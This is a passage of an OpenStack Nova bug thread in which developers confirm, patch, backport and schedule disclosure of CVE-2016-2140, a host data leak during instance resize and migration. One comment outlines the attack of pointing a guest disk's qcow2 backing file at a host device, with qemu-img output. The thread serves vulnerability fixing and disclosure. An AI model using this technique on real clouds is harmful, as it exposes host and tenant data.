I confirm the scenario described in comment #7 reproduces with a stable/liberty devstack and I verified the patch successfully fix the issue: after the resize, /dev/vdb is still a raw device with the qcow header visible.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-02-25: |  |  | [#29](/nova/%2Bbug/1548450/comments/29) |
| --- | --- | --- | --- |

It also reproduces with rdo-kilo and the patch also successfully fix the issue. It was a bit more complicated since the provided novaclient doesn't work with ephemeral disk and by default nova doesn't allow resize on the same host... Finally the patch doesn't apply cleanly on rdo kilo, I tried to use it directly on top of /usr/lib/python2.7/site-packages/nova using "patch -p2":

patching file virt/libvirt/driver.py

Hunk #1 succeeded at 5804 with fuzz 2 (offset -821 lines).

Hunk #2 FAILED at 7195.

The failed hunk contains unresolved symbols: on\_execute, on\_completion and compression that needs to be removed.

It also reproduces with rdo-kilo and the patch also successfully fix the issue. It was a bit more complicated since the provided novaclient doesn't work with ephemeral disk and by default nova doesn't allow resize on the same host... Finally the patch doesn't apply cleanly on rdo kilo, I tried to use it directly on top of /usr/lib/python2.7/site-packages/nova using "patch -p2":
patching file virt/libvirt/driver.py
Hunk #1 succeeded at 5804 with fuzz 2 (offset -821 lines).
Hunk #2 FAILED at 7195.
The failed hunk contains unresolved symbols: on\_execute, on\_completion and compression that needs to be removed.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-02-26: |  |  | [#30](/nova/%2Bbug/1548450/comments/30) |
| --- | --- | --- | --- |

And it seems like the shelve issue is real and not fixed by the propose patch.

After overwritting the root disk of an instance (using vda1 as backing file), here is what the shelve action produce:

7084 ? Ssl 1:05 /usr/bin/python /usr/bin/nova-compute

11792 ? Sl 2:40 \\_ qemu-img convert -f qcow2 -O qcow2 \

  /var/lib/nova/instances/f531dd97-3e5c-4f2c-88fb-740e97c3f0d2/disk \

  /var/lib/nova/instances/snapshots/tmpSLRPxG/f345630013ca4fe0a29b203e2b3afa61

# openstack-config --get /etc/nova/nova.conf libvirt use\_cow\_images

False

# qemu-img info /var/lib/nova/instances/f531dd97-3e5c-4f2c-88fb-740e97c3f0d2/disk

image: /var/lib/nova/instances/f531dd97-3e5c-4f2c-88fb-740e97c3f0d2/disk

file format: qcow2

virtual size: 100G (107374182400 bytes)

disk size: 5.0G

cluster\_size: 65536

backing file: /dev/vda1

backing file format: raw

Format specific information:

    compat: 1.1

    lazy refcounts: false

# qemu-img info /var/lib/nova/instances/snapshots/tmpSLRPxG/f345630013ca4fe0a29b203e2b3afa61

image: /var/lib/nova/instances/snapshots/tmpSLRPxG/f345630013ca4fe0a29b203e2b3afa61

file format: qcow2

virtual size: 100G (107374182400 bytes)

disk size: 7.5G

cluster\_size: 65536

Format specific information:

    compat: 1.1

    lazy refcounts: false

The snapshot is still growing and likely to contain the controller disk, I'll check again tomorrow if the user can retrieve it.

And it seems like the shelve issue is real and not fixed by the propose patch.
After overwritting the root disk of an instance (using vda1 as backing file), here is what the shelve action produce:
7084 ? Ssl 1:05 /usr/bin/python /usr/bin/nova-compute
11792 ? Sl 2:40 \\_ qemu-img convert -f qcow2 -O qcow2 \
/var/lib/nova/instances/f531dd97-3e5c-4f2c-88fb-740e97c3f0d2/disk \
/var/lib/nova/instances/snapshots/tmpSLRPxG/f345630013ca4fe0a29b203e2b3afa61
# openstack-config --get /etc/nova/nova.conf libvirt use\_cow\_images
False
# qemu-img info /var/lib/nova/instances/f531dd97-3e5c-4f2c-88fb-740e97c3f0d2/disk
image: /var/lib/nova/instances/f531dd97-3e5c-4f2c-88fb-740e97c3f0d2/disk
file format: qcow2
virtual size: 100G (107374182400 bytes)
disk size: 5.0G
cluster\_size: 65536
backing file: /dev/vda1
backing file format: raw
Format specific information:
compat: 1.1
lazy refcounts: false
# qemu-img info /var/lib/nova/instances/snapshots/tmpSLRPxG/f345630013ca4fe0a29b203e2b3afa61
image: /var/lib/nova/instances/snapshots/tmpSLRPxG/f345630013ca4fe0a29b203e2b3afa61
file format: qcow2
virtual size: 100G (107374182400 bytes)
disk size: 7.5G
cluster\_size: 65536
Format specific information:
compat: 1.1
lazy refcounts: false
The snapshot is still growing and likely to contain the controller disk, I'll check again tomorrow if the user can retrieve it.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-02-26: |  |  | [#31](/nova/%2Bbug/1548450/comments/31) |
| --- | --- | --- | --- |

Sean, Dan B,

The first stage goal of my libvirt storage pools series is to promote disk.info to a per-instance storage policy. Critically, once I have finished the refactor of Image.cache() I will be able to pull the management of disk.info out of the storage classes and promote it to what is currently Backend. With that in place, we will have enough context to create disk.info \*before\* creating the disk. Also, as discussed with Dan S, I am expanding the data that it stores to include not just format, but also which backend it uses, and its size. With this metadata stored persistently independent of the disk itself we will never have to inspect a disk with qemu-img info, and this class of bug will go away.

There is a separate discussion to be had around where the best place to store this kind of information is. disk.info is what we have now, so I'm running with that. It would be ideal if we could take it straight out of libvirt. Unfortunately though, because we don't use persistent domains we lose all of this information every time the instance shuts down. We could potentially use instance system metadata, and I will look into that. For today, though, I'm working on a Mitaka patch which understands an expanded format of disk.info which I intend to use in Newton. If we ultimately choose to move the data elsewhere that's fine, but the data needs to exist, and the code needs to be restructured so that it can use it safely.

The problem with the current code is the Image.cache() function. This function does everything for all backends. It is passed a callback function which creates something by some means. The cache() function does not know what it creates, or where it comes from. This means that, as in the case of the poorly-named Raw backend[1], if cache() is creating an image-backed disk whose format is dependent on the format of the image it is downloading, it does not have enough context to know:

1. What the expected format is of the image that it is downloading.

2. That it is even downloading an image at all.

Its only option with the current structure is to call the callback and test what it got. My series splits this into create\_from\_func() for ephemeral and swap disks, and create\_from\_image() for images. This gives the backend enough context to know what it is creating before it creates it, so it can safely create and use the metadata described above. The first part of that, create\_from\_func() is here: <https://review.openstack.org/#/c/282580/> . It needs updating and it's not going to make Mitaka, but I stress that the disk.info patch which I should hopefully post today is required in Mitaka in order to be able to make these changes in Newton.

[1] <https://review.openstack.org/#/c/279626/>

Sean, Dan B,
The first stage goal of my libvirt storage pools series is to promote disk.info to a per-instance storage policy. Critically, once I have finished the refactor of Image.cache() I will be able to pull the management of disk.info out of the storage classes and promote it to what is currently Backend. With that in place, we will have enough context to create disk.info \*before\* creating the disk. Also, as discussed with Dan S, I am expanding the data that it stores to include not just format, but also which backend it uses, and its size. With this metadata stored persistently independent of the disk itself we will never have to inspect a disk with qemu-img info, and this class of bug will go away.
There is a separate discussion to be had around where the best place to store this kind of information is. disk.info is what we have now, so I'm running with that. It would be ideal if we could take it straight out of libvirt. Unfortunately though, because we don't use persistent domains we lose all of this information every time the instance shuts down. We could potentially use instance system metadata, and I will look into that. For today, though, I'm working on a Mitaka patch which understands an expanded format of disk.info which I intend to use in Newton. If we ultimately choose to move the data elsewhere that's fine, but the data needs to exist, and the code needs to be restructured so that it can use it safely.
The problem with the current code is the Image.cache() function. This function does everything for all backends. It is passed a callback function which creates something by some means. The cache() function does not know what it creates, or where it comes from. This means that, as in the case of the poorly-named Raw backend[1], if cache() is creating an image-backed disk whose format is dependent on the format of the image it is downloading, it does not have enough context to know:
1. What the expected format is of the image that it is downloading.
2. That it is even downloading an image at all.
Its only option with the current structure is to call the callback and test what it got. My series splits this into create\_from\_func() for ephemeral and swap disks, and create\_from\_image() for images. This gives the backend enough context to know what it is creating before it creates it, so it can safely create and use the metadata described above. The first part of that, create\_from\_func() is here: https://review.openstack.org/#/c/282580/ . It needs updating and it's not going to make Mitaka, but I stress that the disk.info patch which I should hopefully post today is required in Mitaka in order to be able to make these changes in Newton.
[1] https://review.openstack.org/#/c/279626/

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-02-26: |  |  | [#32](/nova/%2Bbug/1548450/comments/32) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/nova/%2Bbug/1548450/comments/32/%2Bdownload) (4.5 KiB)

Thanks Tristan, was this on your rdo kilo env? This looks like you've hit OSSA 2016-001 / bug#1524274, which package version are you using? Anything prior to 2015.1.3 will hit this, I'm following up with the RDO team to ensure this version is available now.

Looking into the unshelve case we appear protected by a check within nova/virt/images.fetch\_to\_raw that correctly detects that a backing\_file is now listed and blocks any attempt at unshelving the instance :

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [req-e3d11cbb-3a55-4eaa-ac99-592c751209ea 4e15d42d6f2d40c781b3097315a835af 37e7ea4bcdfc471191ea1267e7e6b4e0 - - -] [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] Instance failed to spawn

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] Traceback (most recent call last):

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/compute/manager.py", line 4316, in \_unshelve\_instance

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] block\_device\_info=block\_device\_info)

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/driver.py", line 2516, in spawn

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] admin\_pass=admin\_password)

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/driver.py", line 2940, in \_create\_image

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] instance, size, fallback\_from\_host)

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/driver.py", line 6409, in \_try\_fetch\_image\_cache

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] size=size)

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/imagebackend.py", line 240, in cache

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] \*args, \*\*kwargs)

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/imagebackend.py", line 472, in create\_image

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] prepare\_template(target=base, max\_size=size, \*args, \*\*kwargs)

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/oslo\_concurrency/lockutils.py", line 254, in inner

2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-20...

[Read more...](/nova/%2Bbug/1548450/comments/32)

Thanks Tristan, was this on your rdo kilo env? This looks like you've hit OSSA 2016-001 / bug#1524274, which package version are you using? Anything prior to 2015.1.3 will hit this, I'm following up with the RDO team to ensure this version is available now.
Looking into the unshelve case we appear protected by a check within nova/virt/images.fetch\_to\_raw that correctly detects that a backing\_file is now listed and blocks any attempt at unshelving the instance :
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [req-e3d11cbb-3a55-4eaa-ac99-592c751209ea 4e15d42d6f2d40c781b3097315a835af 37e7ea4bcdfc471191ea1267e7e6b4e0 - - -] [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] Instance failed to spawn
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] Traceback (most recent call last):
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/compute/manager.py", line 4316, in \_unshelve\_instance
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] block\_device\_info=block\_device\_info)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/driver.py", line 2516, in spawn
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] admin\_pass=admin\_password)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/driver.py", line 2940, in \_create\_image
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] instance, size, fallback\_from\_host)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/driver.py", line 6409, in \_try\_fetch\_image\_cache
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] size=size)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/imagebackend.py", line 240, in cache
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] \*args, \*\*kwargs)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/imagebackend.py", line 472, in create\_image
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] prepare\_template(target=base, max\_size=size, \*args, \*\*kwargs)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/oslo\_concurrency/lockutils.py", line 254, in inner
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] return f(\*args, \*\*kwargs)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/imagebackend.py", line 230, in fetch\_func\_sync
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] fetch\_func(target=target, \*args, \*\*kwargs)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/libvirt/utils.py", line 406, in fetch\_image
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] max\_size=max\_size)
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] File "/usr/lib/python2.7/site-packages/nova/virt/images.py", line 126, in fetch\_to\_raw
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] {'fmt': fmt, 'backing\_file': backing\_file}))
2016-02-26 06:40:17.248 3903 ERROR nova.compute.manager [instance: 8dcd132e-2083-4987-8197-fd56d6ce38e9] ImageUnacceptable: Image 2cb1fb9e-f628-4d3f-8de8-09070c5de7fa is unacceptable: fmt=qcow2 backed by: /dev/sda3
So it looks like we still only have the live and cold migration cases to fix at the moment.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-02-26: |  |  | [#33](/nova/%2Bbug/1548450/comments/33) |
| --- | --- | --- | --- |

Just to clarify Lee's last, I still consider the unshelve case a bug. However, it's not an exploitable bug because of the checking in fetch\_to\_raw. We should fix it, but given that it's substantially more complex than all the other cases I don't think we need to deal with it via this process.

Just to clarify Lee's last, I still consider the unshelve case a bug. However, it's not an exploitable bug because of the checking in fetch\_to\_raw. We should fix it, but given that it's substantially more complex than all the other cases I don't think we need to deal with it via this process.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-02-26: |  |  | [#34](/nova/%2Bbug/1548450/comments/34) |
| --- | --- | --- | --- |

Lee, you are correct, I tested the shelve issue against openstack-nova-api-2015.1.1-1.el7.noarch.

But if it's not exploitable, then it seems like the impact description in comment #11 still holds.

Does the patch fix cold and live migrate issue ?

If so, then it may need better commit message and also clean backports for stable/liberty and stable/kilo.

Lee, you are correct, I tested the shelve issue against openstack-nova-api-2015.1.1-1.el7.noarch.
But if it's not exploitable, then it seems like the impact description in comment #11 still holds.
Does the patch fix cold and live migrate issue ?
If so, then it may need better commit message and also clean backports for stable/liberty and stable/kilo.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-02-26: |  |  | [#35](/nova/%2Bbug/1548450/comments/35) |
| --- | --- | --- | --- |

Correct, the impact statement is still correct. The patch fixes both cold (including resize) and live migrations. I'll add a commit message, backport to liberty and kilo now.

Correct, the impact statement is still correct. The patch fixes both cold (including resize) and live migrations. I'll add a commit message, backport to liberty and kilo now.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-03-01: |  |  | [#39](/nova/%2Bbug/1548450/comments/39) |
| --- | --- | --- | --- |

Tristian, apologies for the delay, I have finally attached the master, stable/liberty and stable/kilo patches I've been working on after completing some additional devstack testing for the master patch.

Tristian, apologies for the delay, I have finally attached the master, stable/liberty and stable/kilo patches I've been working on after completing some additional devstack testing for the master patch.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-03-01: |  |  | [#40](/nova/%2Bbug/1548450/comments/40) |
| --- | --- | --- | --- |

Still +1 here on the above patches. I feel like we should propose a release date.

Still +1 here on the above patches. I feel like we should propose a release date.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-03-01: |  |  | [#41](/nova/%2Bbug/1548450/comments/41) |
| --- | --- | --- | --- |

Thanks Lee, I'm currently waiting for tox results on all three patchs. CVE has been requested with impact description from comment #11.

If we could send the pre-OSSA out by Friday, I'd like to propose this disclosure date:

2016-03-09, 1500 UTC

Thanks Lee, I'm currently waiting for tox results on all three patchs. CVE has been requested with impact description from comment #11.
If we could send the pre-OSSA out by Friday, I'd like to propose this disclosure date:
2016-03-09, 1500 UTC

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-03-01: |  |  | [#42](/nova/%2Bbug/1548450/comments/42) |
| --- | --- | --- | --- |

Not sure if it's related, but stable/kilo unit tests are failing with:

==============================

Failed 1 tests - output below:

==============================

nova.tests.unit.virt.libvirt.test\_driver.LibvirtDriverTestCase.test\_migrate\_disk\_and\_power\_off\_resize\_copy\_disk\_info

--------------------------------------------------------------------------------------------------------------------

Captured pythonlogging:

~~~~~~~~~~~~~~~~~~~~~~~

    2016-03-01 15:16:29,413 WARNING [nova.virt.libvirt.firewall] Libvirt module could not be loaded. NWFilterFirewall will not work correctly.

Captured traceback:

~~~~~~~~~~~~~~~~~~~

    Traceback (most recent call last):

      File "/home/centos/cve/nova\_kilo/.tox/py27/lib/python2.7/site-packages/mock.py", line 1201, in patched

        return func(\*args, \*\*keywargs)

      File "nova/tests/unit/virt/libvirt/test\_driver.py", line 11683, in test\_migrate\_disk\_and\_power\_off\_resize\_copy\_disk\_info

        on\_completion=mock.ANY, compression=mock.ANY)

      File "/home/centos/cve/nova\_kilo/.tox/py27/lib/python2.7/site-packages/mock.py", line 891, in assert\_any\_call

        '%s call not found' % expected\_string

    AssertionError: copy\_image(u'/test\_resize/disk.info', u'/test/disk.info', on\_execute=<ANY>, host=<mock.\_Sentinel object at 0x26b27d0>, on\_completion=<ANY>, compres

sion=<ANY>) call not found

Not sure if it's related, but stable/kilo unit tests are failing with:
==============================
Failed 1 tests - output below:
==============================
nova.tests.unit.virt.libvirt.test\_driver.LibvirtDriverTestCase.test\_migrate\_disk\_and\_power\_off\_resize\_copy\_disk\_info
--------------------------------------------------------------------------------------------------------------------
Captured pythonlogging:
~~~~~~~~~~~~~~~~~~~~~~~
2016-03-01 15:16:29,413 WARNING [nova.virt.libvirt.firewall] Libvirt module could not be loaded. NWFilterFirewall will not work correctly.
Captured traceback:
~~~~~~~~~~~~~~~~~~~
Traceback (most recent call last):
File "/home/centos/cve/nova\_kilo/.tox/py27/lib/python2.7/site-packages/mock.py", line 1201, in patched
return func(\*args, \*\*keywargs)
File "nova/tests/unit/virt/libvirt/test\_driver.py", line 11683, in test\_migrate\_disk\_and\_power\_off\_resize\_copy\_disk\_info
on\_completion=mock.ANY, compression=mock.ANY)
File "/home/centos/cve/nova\_kilo/.tox/py27/lib/python2.7/site-packages/mock.py", line 891, in assert\_any\_call
'%s call not found' % expected\_string
AssertionError: copy\_image(u'/test\_resize/disk.info', u'/test/disk.info', on\_execute=<ANY>, host=<mock.\_Sentinel object at 0x26b27d0>, on\_completion=<ANY>, compres
sion=<ANY>) call not found

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-03-01: |  |  | [#43](/nova/%2Bbug/1548450/comments/43) |
| --- | --- | --- | --- |

Apologies, that's another conflict, the compress argument was added to libvirt\_utils.copy\_image in Liberty, removing this and updating the commit message now.

Apologies, that's another conflict, the compress argument was added to libvirt\_utils.copy\_image in Liberty, removing this and updating the commit message now.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-03-01: |  |  | [#44](/nova/%2Bbug/1548450/comments/44) |
| --- | --- | --- | --- |

I've updated and attached the Kilo patch, apologies again.

I've updated and attached the Kilo patch, apologies again.

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2016-03-01

| **summary**: | Host data leak during resize/migrate for raw-backed instances+ (CVE-2016-2140) |
| --- | --- |
| Changed in ossa: | |
| **status**: | Confirmed → In Progress |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-03-01:  [**Re: Host data leak during resize/migrate for raw-backed instances (CVE-2016-2140)**](/nova/%2Bbug/1548450/comments/45) |  |  | [#45](/nova/%2Bbug/1548450/comments/45) |
| --- | --- | --- | --- |

Running tox -epy27 with patch in comment #44:

  py27: commands succeeded

  pep8: commands succeeded

  congratulations :)

Assuming these patchs get pre-approved soon, is 2016-03-09, 1500 UTC too early for disclosure date ?

Running tox -epy27 with patch in comment #44:
py27: commands succeeded
pep8: commands succeeded
congratulations :)
Assuming these patchs get pre-approved soon, is 2016-03-09, 1500 UTC too early for disclosure date ?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Booth (mbooth-9)](https://launchpad.net/~mbooth-9) wrote on 2016-03-02: |  |  | [#46](/nova/%2Bbug/1548450/comments/46) |
| --- | --- | --- | --- |

2016-03-09 works for me, but I feel we could even go sooner than that assuming we get the pre-approval. What's the schedule like?

2016-03-09 works for me, but I feel we could even go sooner than that assuming we get the pre-approval. What's the schedule like?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-03-02: |  |  | [#47](/nova/%2Bbug/1548450/comments/47) |
| --- | --- | --- | --- |

Matthew, if the pre-OSSA is sent between Monday and Thursday, we could disclose the next Tuesday.

And if it's sent early on Friday, it can be disclosed next Wednesday.

Finally, if it's sent late Friday or early enough Monday, it can be disclosed the next Thursday.

Matthew, if the pre-OSSA is sent between Monday and Thursday, we could disclose the next Tuesday.
And if it's sent early on Friday, it can be disclosed next Wednesday.
Finally, if it's sent late Friday or early enough Monday, it can be disclosed the next Thursday.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Andrew Laski (alaski)](https://launchpad.net/~alaski) wrote on 2016-03-02: |  |  | [#48](/nova/%2Bbug/1548450/comments/48) |
| --- | --- | --- | --- |

I will echo what was said by Dan and I previously: it would be preferable to recreate disk.info rather than copy it because in an upgrade scenario if the format changes you may be copying a format that the destination compute does not understand. If this was not a security fix I would hold on that point until we could reach a consensus on the approach. However I will just note my disagreement with the approach here but say that the patch looks good to me for addressing the bug.

I will echo what was said by Dan and I previously: it would be preferable to recreate disk.info rather than copy it because in an upgrade scenario if the format changes you may be copying a format that the destination compute does not understand. If this was not a security fix I would hold on that point until we could reach a consensus on the approach. However I will just note my disagreement with the approach here but say that the patch looks good to me for addressing the bug.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2016-03-02: |  |  | [#49](/nova/%2Bbug/1548450/comments/49) |
| --- | --- | --- | --- |

Thank you Andrew for reading through this, is the disk.info format changed between kilo and mitaka release ? If there are no foreseeable upgrade breakage, then I would prefer we fix the immediate issue and put that "disk.info rewrite" story on top of nova backlog.

So if that's ok with you, let's send the pre-OSSA today with a disclosure date set to:

2016-03-08, 1500 UTC

Thank you Andrew for reading through this, is the disk.info format changed between kilo and mitaka release ? If there are no foreseeable upgrade breakage, then I would prefer we fix the immediate issue and put that "disk.info rewrite" story on top of nova backlog.
So if that's ok with you, let's send the pre-OSSA today with a disclosure date set to:
2016-03-08, 1500 UTC

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Andrew Laski (alaski)](https://launchpad.net/~alaski) wrote on 2016-03-02: |  |  | [#50](/nova/%2Bbug/1548450/comments/50) |
| --- | --- | --- | --- |

No, the disk.info format has not changed and there is no foreseeable upgrade breakage. The copy is just something that may need to be changed to a recreate later if there are plans to update disk.info at some point.

I'm okay with moving forward with this.

No, the disk.info format has not changed and there is no foreseeable upgrade breakage. The copy is just something that may need to be changed to a recreate later if there are plans to update disk.info at some point.
I'm okay with moving forward with this.

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2016-03-02

| Changed in ossa: | |
| --- | --- |
| **status**: | In Progress → Fix Committed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-03-04: |  |  | [#51](/nova/%2Bbug/1548450/comments/51) |
| --- | --- | --- | --- |

* [0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-master.patch](https://bugs.launchpad.net/nova/%2Bbug/1548450/%2Battachment/4588377/%2Bfiles/0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-master.patch)
  [Edit](/nova/%2Bbug/1548450/%2Battachment/4588377)
  (8.2 KiB,
  text/plain)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-03-04: |  |  | [#52](/nova/%2Bbug/1548450/comments/52) |
| --- | --- | --- | --- |

* [0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-liberty.patch](https://bugs.launchpad.net/nova/%2Bbug/1548450/%2Battachment/4588378/%2Bfiles/0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-liberty.patch)
  [Edit](/nova/%2Bbug/1548450/%2Battachment/4588378)
  (8.2 KiB,
  text/plain)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Lee Yarwood (lyarwood)](https://launchpad.net/~lyarwood) wrote on 2016-03-04: |  |  | [#53](/nova/%2Bbug/1548450/comments/53) |
| --- | --- | --- | --- |

* [0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-kilo.patch](https://bugs.launchpad.net/nova/%2Bbug/1548450/%2Battachment/4588379/%2Bfiles/0001-libvirt-Always-copy-or-recreate-disk.info-during-a-m-kilo.patch)
  [Edit](/nova/%2Bbug/1548450/%2Battachment/4588379)
  (8.3 KiB,
  text/plain)

Revision history for this message
